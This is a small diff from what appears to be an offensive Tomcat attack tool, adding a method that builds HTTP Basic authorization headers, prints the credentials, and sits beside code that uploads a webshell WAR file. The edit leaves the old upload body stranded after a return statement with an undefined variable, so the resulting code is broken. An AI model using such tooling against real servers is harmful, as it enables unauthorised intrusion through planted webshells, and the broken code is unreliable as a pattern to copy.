@@ -184,7 +184,13 @@ class authenticated_attack(tomcat):
         self.username = username
         self.password = password
 
-    def upload(self, payload_path) -> str:
+    def return_headers(self) -> dict:
+        headers = {
+            'Authorization': 'Basic ' + f"{base64.b64encode(f'{self.username}:{self.password}'.encode()).decode('utf-8')}",
+            'User-Agent': 'JerryCat'
+        }
+        print(headers)
+        return headers
         if payload_path is None:
             payload_path = './webshell/webshell.war'
 
